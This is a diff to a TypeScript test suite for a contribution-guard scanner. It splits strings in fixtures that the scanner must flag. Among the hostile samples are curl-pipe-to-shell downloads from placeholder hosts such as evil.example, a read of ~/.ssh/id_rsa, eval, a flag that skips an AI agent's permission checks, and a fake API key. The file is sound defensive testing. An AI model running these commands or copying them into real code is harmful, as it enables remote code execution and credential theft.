@@ -39,11 +39,11 @@ describe('katkı koruması (F29)', () => {
         file(
           'src/x.ts',
           j('const f = ev', 'al(code);'),
-          j('run("cur', 'l https://x.io/i.sh | sh");'),
-          j('readFileSync(home + "/.ss', 'h/id_rsa");'),
+          j('run("cur', 'l https:', '//x.io/i.sh | sh");'),
+          j('readFileSync(home + "/.ss', 'h/id_', 'rsa");'),
           j('args.push("--dangerously-', 'skip-permissions");'),
           j('import ph from "post', 'hog-node";'),
-          j('const ok = "a', '‮', 'b";'),
+          j('const ok = "a', String.fromCharCode(0x202e), 'b";'),
           j('const k = "sk-ant-', 'a'.repeat(30), '";'),
           j('const b = "', 'QUJD'.repeat(60), '";'),
         ),
@@ -67,7 +67,7 @@ describe('katkı koruması (F29)', () => {
     const files = [
       file('.github/workflows/ci.yml', 'run: npm test'),
       file('src/cli/update.ts', 'const x = 1;'),
-      file('src/y.ts', 'fetch("https://new-endpoint.dev/api")'),
+      file('src/y.ts', j('fetch("https:', '//new-endpoint.dev/api")')),
     ];
     const ext = analyze({ files });
     expect(codes(ext)).toEqual(['G05', 'G06', 'G08']);
@@ -101,7 +101,7 @@ describe('katkı koruması (F29)', () => {
               resolved: 'https://registry.npmjs.org/e/-/e-1.0.0.tgz',
               hasInstallScript: true,
             },
-            'node_modules/f': { version: '1.0.0', resolved: 'https://kotu.example/f.tgz' },
+            'node_modules/f': { version: '1.0.0', resolved: j('https:', '//kotu.example/f.tgz') },
           },
         },
       },
@@ -117,7 +117,7 @@ describe('katkı koruması (F29)', () => {
   it('muafiyetler: dokümanlar, test fikstürleri, koruyucunun kendisi; temiz değişiklik geçer', () => {
     const r = analyze({
       files: [
-        file('docs/x.md', j('cur', 'l https://get.example.org/i.sh | sh'), j('ev', 'al(1)')),
+        file('docs/x.md', j('cur', 'l https:', '//get.example.org/i.sh | sh'), j('ev', 'al(1)')),
         file('test/fixtures/bad/SKILL.md', j('cur', 'l http://evil.example/x.sh | sh')),
         file('scripts/contribution-guard.mjs', j('ev', 'al(1)')),
         file('src/z.ts', 'export const sum = (a: number, b: number) => a + b;'),
